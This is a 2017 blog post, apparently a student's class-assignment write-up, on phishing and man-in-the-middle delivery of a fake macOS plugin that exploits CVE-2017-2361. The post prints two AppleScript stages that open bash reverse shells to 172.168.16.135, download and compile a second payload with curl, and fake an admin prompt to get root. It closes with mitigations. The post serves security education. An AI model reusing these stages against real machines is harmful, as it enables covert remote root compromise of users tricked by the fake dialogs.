---
date: 2017-08-21 00:00:00 +0000
layout: post
tags:
- phishing
- macos
title: Phishing for shells on rotten apples
---
## Introduction

A few weeks ago I was given peculiar class assignment. I had to “root a Mac”. User interaction allowed. We were given an outdated Virtual Machine with OS X Tiger 10.7.5 installed, so I thought I’d be pretty easy. I was proven wrong very quickly, while doing some basic research.

Although 10.7.5 has been released in 2012 and its support ended in September 2015, unfortunately I couldn’t find any reliable remote exploits and hardware related exploits like [this one](http://blog.frizk.net/2016/12/filevault-password-retrieval.html)  are out of scope since I’m fiddling with a Virtual Machine and have no macbook to test on. There are few attack vectors in a default installation, given that only minimal services are running and [no third party software](https://vulnsec.com/2016/osx-apps-vulnerabilities/)  is installed.

It has often been argued that macs may not have enough [usage share](https://en.wikipedia.org/wiki/Usage_share_of_operating_systems)   to be found an attractive and profitable target, but they can be found all over in print and marketing departments and in fancy design agencies. Even though apple counts on its gated environment, macos users aren’t forced to update or are afraid to do so ("Stay with $currentversion because $software works") [end up with a vulnerable system](https://www.intego.com/mac-security-blog/os-x-market-share-statistics-1-in-5-macs-still-unsupported/).

Even worse, many mac users apparently seek to disable Gatekeeper, because $software doesn't install:

![]({{ site.baseurl }}/forestryio/images/gatekeeper.png)

![]({{ site.baseurl }}/forestryio/images/gatekeeper_2.png)

![]({{ site.baseurl }}/forestryio/images/gatekeeper_3.png)

<span style="font-size: 1rem;">I came up with a lifelike scenario which requires minimal interaction (Default Browser/Email, one or two clicks) and where successful exploitation would lead to remote root on a rather modern macos (Sierra 10.12).</span>

## Setup

For this scenario let’s assume that:

* [Gatekeeper](https://support.apple.com/en-us/HT202491) is disabled (non-default). Disable it using *sudo spctl --master-disable*

* <span style="font-size: 1rem;">Victim user is admin (default)</span>

* Safari opens safe-files (zip files) (default)

* Network (i.e. WiFi) is compromised

## Malware

After investigating existing malware and viable ways (i.e. [dylib hijacking](https://www.virusbulletin.com/virusbulletin/2015/03/dylib-hijacking-os-x)) of delivering and executing malware on a mac, <span style="font-size: 1rem;">I came to the conclusion that I'd keep it simple and decided to go with native AppleScript.</span>

AppleScript is pretty easy to learn and after reading this inspiring post about [Privilege escalation on OS X – without exploits](https://www.n00py.io/2016/10/p), i knew what I wanted:

![]({{ site.baseurl }}/forestryio/images/macos_2-1.png)

The attacker tricks the victim into downloading and executing malicious software injecting it into some legitimate looking website via MitM. If the victim clicks, t<span style="font-size: 1rem;">he payload <b>FancyPlugin.app</b> is downloaded as a zip file. Since zip files are considered as <i>safe</i>&nbsp;by Safari it gets automatically extracted and then executed by&nbsp;CVE-2017-2361 (Exploit in HelpViewer).</span>

<blockquote class="twitter-tweet" data-cards="hidden" data-lang="en"><p lang="en" dir="ltr">CVE-2017-2361: MacOS X HelpViewer XSS leads to arbitrary file execution and arbitrary file read <a href="https://t.co/2MmzTp0pW6">https://t.co/2MmzTp0pW6</a> <a href="https://twitter.com/hashtag/vulnerability?src=hash">#vulnerability</a> <a href="https://t.co/MBy2jPjNhl">pic.twitter.com/MBy2jPjNhl</a></p>— x0rz (@x0rz) <a href="https://twitter.com/x0rz/status/834507292884230145">February 22, 2017</a></blockquote>
<script type="null"></script>

The script opens a metasploit shell, "fails installation" showing some innocent error message and drops the root shell into a temporary folder, and runs it as a background process where it waits silently until System Preferences is executed by the user.

```

--stage one
tell application "HelpViewer"
	quit
end tell
delay 1
do shell script "/bin/bash -i &amp;amp;amp;amp;amp;gt;&amp;amp;amp;amp;amp;amp; /dev/tcp/172.168.16.135/443 0&amp;amp;amp;amp;amp;gt;&amp;amp;amp;amp;amp;amp;1 &amp;amp;amp;amp;amp;gt; /dev/null 2&amp;amp;amp;amp;amp;gt;&amp;amp;amp;amp;amp;amp;1 &amp;amp;amp;amp;amp;amp;"
display dialog "Warning: Can't install fancy new App. OK go back to work!" buttons {"OK"} default button "OK"
do shell script "curl http://172.168.16.135/root.zip &amp;amp;amp;amp;amp;gt; /tmp/root.zip &amp;amp;amp;amp;amp;amp;&amp;amp;amp;amp;amp;amp; cd /tmp &amp;amp;amp;amp;amp;amp;&amp;amp;amp;amp;amp;amp; unzip root.zip &amp;amp;amp;amp;amp;amp;&amp;amp;amp;amp;amp;amp; osacompile -o root.app root.txt &amp;amp;amp;amp;amp;amp;&amp;amp;amp;amp;amp;amp; mv applet.icns root.app/Contents/Resources/applet.icns"
repeat until application "System Preferences" is running
	delay 2
end repeat
do shell script "open /tmp/root.app"

```

When root.app gets executed it overlays a legitimate administrator app and asks for administrator privileges as if it was the app asking:

```

-- stage 2
do shell script "/bin/bash -i &amp;amp;amp;gt;&amp;amp;amp;amp; /dev/tcp/172.168.16.135/8080 0&amp;amp;amp;gt;&amp;amp;amp;amp;1 &amp;amp;amp;gt; /dev/null 2&amp;amp;amp;gt;&amp;amp;amp;amp;1 &amp;amp;amp;amp;" with administrator privileges
delay 3
display notification "https://www.apple.com" with title "got root" sound name "Ping"

```

## Where it all comes together

<iframe width="560" height="315" src="https://www.youtube-nocookie.com/embed/hk8Y3LYYXCk?rel=0&amp;showinfo=0" frameborder="0" allowfullscreen=""></iframe>

## Mitigations

1. Keep your macos up to date.

1. Don't disable Gatekeeper. If you need to, enable it afterwards.

1. Don't use the administrator account for your daily work.

1. Use [additional security software](https://www.objective-see.com/products.html).

1. Don't click on stupid shit.

